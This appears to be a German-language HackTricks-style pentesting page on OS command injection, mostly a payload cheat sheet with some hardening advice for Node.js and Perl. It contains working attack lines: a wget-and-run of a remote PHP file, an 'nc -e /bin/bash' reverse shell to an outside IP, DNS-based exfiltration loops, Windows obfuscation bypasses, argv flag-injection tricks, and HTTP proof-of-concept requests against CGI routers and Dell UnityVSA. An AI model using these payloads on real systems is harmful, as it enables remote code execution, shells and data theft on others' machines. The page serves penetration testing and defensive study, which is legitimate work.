# Command Injection

{{#include ../banners/hacktricks-training.md}}

## Was ist command Injection?

A **command injection** erlaubt einem Angreifer die Ausführung beliebiger Betriebssystembefehle auf dem Server, der eine Anwendung hostet. Infolgedessen können die Anwendung und alle ihre Daten vollständig kompromittiert werden. Die Ausführung dieser Befehle ermöglicht es dem Angreifer typischerweise, unautorisierten Zugriff oder Kontrolle über die Umgebung der Anwendung und das zugrunde liegende System zu erlangen.

### Kontext

Abhängig davon, **wo Ihre Eingabe injiziert wird**, müssen Sie möglicherweise den **in Anführungszeichen stehenden Kontext beenden** (mit `"` oder `'`), bevor Sie die Befehle ausführen.

## Command Injection/Execution
```bash
#Both Unix and Windows supported
ls||id; ls ||id; ls|| id; ls || id # Execute both
ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe)
ls&&id; ls &&id; ls&& id; ls && id #  Execute 2º if 1º finish ok
ls&id; ls &id; ls& id; ls & id # Execute both but you can only see the output of the 2º
ls %0A id # %0A Execute both (RECOMMENDED)
ls%0abash%09-c%09"id"%0a   # (Combining new lines and tabs)

#Only unix supported
`ls` # ``
$(ls) # $()
ls; id # ; Chain commands
ls${LS_COLORS:10:1}${IFS}id # Might be useful

#Not executed but may be interesting
> /var/www/html/out.txt #Try to redirect the output to a file
< /etc/passwd #Try to send some input to the command
```
### **Limition** Bypasses

Wenn du versuchst, **arbitrary commands inside a linux machine** auszuführen, könnte es für dich interessant sein, diese **Bypasses:** zu lesen.


{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### **Beispiele**
```
vuln=127.0.0.1 %0a wget https://web.es/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php
vuln=127.0.0.1%0anohup nc -e /bin/bash 51.15.192.49 80
vuln=echo PAYLOAD > /tmp/pay.txt; cat /tmp/pay.txt | base64 -d > /tmp/pay; chmod 744 /tmp/pay; /tmp/pay
```
### Parameter

Hier sind die Top-25-Parameter, die anfällig für code injection und ähnliche RCE vulnerabilities sein könnten (von [link](https://twitter.com/trbughunters/status/1283133356922884096)):
```
?cmd={payload}
?exec={payload}
?command={payload}
?execute{payload}
?ping={payload}
?query={payload}
?jump={payload}
?code={payload}
?reg={payload}
?do={payload}
?func={payload}
?arg={payload}
?option={payload}
?load={payload}
?process={payload}
?step={payload}
?read={payload}
?function={payload}
?req={payload}
?feature={payload}
?exe={payload}
?module={payload}
?payload={payload}
?run={payload}
?print={payload}
```
### Time based data exfiltration

Daten extrahieren: char by char
```
swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
real    0m5.007s
user    0m0.000s
sys 0m0.000s

swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
real    0m0.002s
user    0m0.000s
sys 0m0.000s
```
### DNS based data exfiltration

Basierend auf dem Tool von `https://github.com/HoLyVieR/dnsbin`, ebenfalls gehostet auf dnsbin.zhack.ca
```
1. Go to http://dnsbin.zhack.ca/
2. Execute a simple 'ls'
for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
```

```
$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il)
```
Online-Tools zur Überprüfung auf DNS-basierte data exfiltration:

- dnsbin.zhack.ca
- pingb.in

### Filtering bypass

#### Windows
```
powershell C:**2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:**32\c*?c.e?e # calc
```
#### Linux


{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### Node.js `child_process.exec` vs `execFile`

Beim Audit von JavaScript/TypeScript-Back-ends stößt man häufig auf die Node.js `child_process` API.
```javascript
// Vulnerable: user-controlled variables interpolated inside a template string
const { exec } = require('child_process');
exec(`/usr/bin/do-something --id_user ${id_user} --payload '${JSON.stringify(payload)}'`, (err, stdout) => {
/* … */
});
```
`exec()` startet eine **shell** (`/bin/sh -c`), daher führt jedes Zeichen, das für die shell eine spezielle Bedeutung hat (back-ticks, `;`, `&&`, `|`, `$()`, …), zu **command injection**, wenn Benutzereingaben in den String verkettet werden.

**Gegenmaßnahme:** verwende `execFile()` (oder `spawn()` ohne die `shell`-Option) und übergebe **jedes Argument als separates Array-Element**, sodass keine shell beteiligt ist:
```javascript
const { execFile } = require('child_process');
execFile('/usr/bin/do-something', [
'--id_user', id_user,
'--payload', JSON.stringify(payload)
]);
```
Real-world case: *Synology Photos* ≤ 1.7.0-0794 war durch ein nicht authentifiziertes WebSocket-Ereignis ausnutzbar, das vom Angreifer kontrollierte Daten in `id_user` platzierte, die später in einem `exec()`-Aufruf eingebettet wurden und RCE ermöglichten (Pwn2Own Ireland 2024).

### Argument/Option injection via leading hyphen (argv, no shell metacharacters)

Nicht alle Injektionen erfordern shell-Metazeichen. Wenn die Anwendung nicht vertrauenswürdige Strings als Argumente an ein Systemutility übergibt (selbst mit `execve`/`execFile` und ohne Shell), werden viele Programme immer noch jedes Argument, das mit `-` oder `--` beginnt, als Option interpretieren. Das erlaubt einem Angreifer, Modi umzuschalten, Ausgabepfade zu ändern oder gefährliches Verhalten auszulösen, ohne jemals in eine Shell zu gelangen.

Typische Stellen, an denen dies auftritt:

- Embedded web UIs/CGI handlers, die Befehle wie `ping <user>`, `tcpdump -i <iface> -w <file>`, `curl <url>` etc. zusammenbauen.
- Centralized CGI routers (z. B. `/cgi-bin/<something>.cgi` mit einem Selector-Parameter wie `topicurl=<handler>`), wo mehrere Handler denselben schwachen Validator wiederverwenden.

Was zu versuchen ist:

- Werte liefern, die mit `-`/`--` beginnen, damit das nachgelagerte Tool sie als Flags verarbeitet.
- Flags missbrauchen, die Verhalten ändern oder Dateien schreiben, zum Beispiel:
  - `ping`: `-f`/`-c 100000`, um das Gerät zu belasten (DoS)
  - `curl`: `-o /tmp/x`, um in beliebige Pfade zu schreiben; `-K <url>`, um eine vom Angreifer kontrollierte Konfiguration zu laden
  - `tcpdump`: `-G 1 -W 1 -z /path/script.sh`, um post-rotate-Ausführung in unsicheren Wrappern zu erreichen
- Wenn das Programm `--` als End-of-options unterstützt, versuchen, naive Mitigations zu umgehen, die `--` an der falschen Stelle voranstellen.

Generic PoC shapes against centralized CGI dispatchers:
```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Content-Type: application/x-www-form-urlencoded

# Flip options in a downstream tool via argv injection
topicurl=<handler>&param=-n

# Unauthenticated RCE when a handler concatenates into a shell
topicurl=setEasyMeshAgentCfg&agentName=;id;
```
## Brute-Force Erkennungsliste


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/command_injection.txt
{{#endref}}

## Perl backticks/qx// sinks in Apache mod_perl handlers (Erreichbarkeit und exploitation)

Reales Muster: Perl-Code baut einen Shell-Command-String und führt ihn via backticks (oder qx//) aus. In einem mod_perl AccessHandler können vom Angreifer kontrollierte Request-Komponenten wie $r->uri() in diesen String fließen. Wenn irgendeiner der Pfade rohen Input concatenatet und diesen dann mit einer Shell auswertet, erhält man pre-auth RCE.

Riskante Perl-Ausführungsprimitiven (starten eine Shell, wenn sie einen einzelnen String erhalten):
- Backticks / qx//: my $out = `cmd ...`;
- system with a single string: system("/bin/sh -c '...'") implicitly
- open with a pipe: open my $fh, "cmd |" or "| cmd"
- IPC::Open3 with a single string

Minimal verwundbare Form, in der Praxis beobachtet:
```perl
sub getCASURL {
...
my $exec_cmd = "...";
if ($type eq 'login') {
$exec_cmd .= $uri;        # $uri from $r->uri() → attacker-controlled
my $out = `$exec_cmd`;    # backticks = shell
}
}
```
Wichtige Erreichbarkeitsüberlegungen in mod_perl:
- Handler registration: httpd.conf muss Anfragen in Ihr Perl-Modul routen, z. B. PerlModule MOD_SEC_EMC::AccessHandler und eine Konfiguration, die AccessHandler::handler für einen Pfadbereich aufruft.
- Triggering the vulnerable branch: Erzwingen Sie den unauthenticated login flow, sodass type == "login" (z. B. das erwartete auth cookie weglassen).
- Resolvable path: Stellen Sie sicher, dass Ihre Anfrage auf eine URI abzielt, die innerhalb des konfigurierten Bereichs aufgelöst wird. Wenn Apache die Anfrage niemals durch den handler routet, wird der sink nicht erreicht.

Exploitation workflow
1) Inspect httpd.conf for PerlModule/MOD_PERL handler scopes to find a resolvable path processed by the handler.
2) Send an unauthenticated request so the login redirect path is taken (type == "login").
3) Place shell metacharacters in the request-URI path so $r->uri() carries your payload into the command string.

Example HTTP PoC (path injection via ';')
```http
GET /ui/health;id HTTP/1.1
Host: target
Connection: close
```
Tipps
- Probiere Trenner: ;, &&, |, `backticks`, $(...), und kodierte Zeilenumbrüche (%0A) je nach Quoting.
- Wenn frühere Patches andere args quoten, aber in einem Branch nicht die URI, funktionieren angehängte payloads am Ende des Strings oft: ;id# oder &&/usr/bin/id#

Härtung (Perl)
- Erstelle keine Shell-Strings. Bevorzuge Argument-Vektor-Ausführung: system('/usr/bin/curl', '--silent', '--', $safe_url) — keine Shell.
- Falls eine Shell unvermeidbar ist, escapiere strikt und konsistent über alle Branches hinweg; behandle $r->uri() als feindlich. Erwäge URI::Escape für Pfade/Queries und strenge allowlists.
- Vermeide backticks/qx// für die Befehlsausführung; erfasse Ausgabe via open3/list-Form, falls wirklich nötig, ohne eine Shell zu starten.
- In mod_perl handlers auth/redirect-Codepfade frei von Befehlsausführung halten oder sicherstellen, dass die Sanitization in allen Branches identisch ist, um Regressionen wie „fixed everywhere but one branch“ zu vermeiden.

Vulnerability hunting
- Patch-diff Module, die Shell-Kommandos zusammensetzen; suche nach inkonsistentem Quoting zwischen Branches (z. B. if ($type eq 'login') unescaped gelassen).
- Grep nach backticks, qx//, open\s*\(|\||, und system\s*\(\s*" um string-basierte Shells zu finden. Baue einen Call-Graph vom sink zur Request-Eingabe ($r), um pre-auth Erreichbarkeit zu verifizieren.

Real-world case: Dell UnityVSA pre-auth RCE (CVE-2025-36604)
- Pre-auth command injection via backticks in AccessTool.pm:getCASURL — wenn type == "login" rohes $uri ($r->uri()) angehängt wurde.
- Erreichbar über MOD_SEC_EMC::AccessHandler → make_return_address($r) → getCASLoginURL(..., type="login") → getCASURL(..., $uri, 'login').
- Praktischer Hinweis: Nutze einen auflösbaren Pfad, der vom Handler abgedeckt wird; ansonsten wird das Modul nicht ausgeführt und der Sink nicht erreicht.

## Referenzen

- [It’s Never Simple Until It Is: Dell UnityVSA Pre‑Auth Command Injection (CVE‑2025‑36604)](https://labs.watchtowr.com/its-never-simple-until-it-is-dell-unityvsa-pre-auth-command-injection-cve-2025-36604/)
- [Dell PSIRT DSA‑2025‑281 – Security update for Dell Unity/UnityVSA/Unity XT](https://www.dell.com/support/kbdoc/en-uk/000350756/dsa-2025-281-security-update-for-dell-unity-dell-unityvsa-and-dell-unity-xt-security-update-for-multiple-vulnerabilities)
- [watchTowr Detection Artefact Generator – Dell UnityVSA Pre‑Auth CVE‑2025‑36604](https://github.com/watchtowrlabs/watchTowr-vs-Dell-UnityVSA-PreAuth-CVE-2025-36604)

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [https://portswigger.net/web-security/os-command-injection](https://portswigger.net/web-security/os-command-injection)
- [Extraction of Synology encrypted archives – Synacktiv 2025](https://www.synacktiv.com/publications/extraction-des-archives-chiffrees-synology-pwn2own-irlande-2024.html)
- [PHP proc_open manual](https://www.php.net/manual/en/function.proc-open.php)
- [HTB Nocturnal: IDOR → Command Injection → Root via ISPConfig (CVE‑2023‑46818)](https://0xdf.gitlab.io/2025/08/16/htb-nocturnal.html)
- [Unit 42 – TOTOLINK X6000R: Three New Vulnerabilities Uncovered](https://unit42.paloaltonetworks.com/totolink-x6000r-vulnerabilities/)

{{#include ../banners/hacktricks-training.md}}
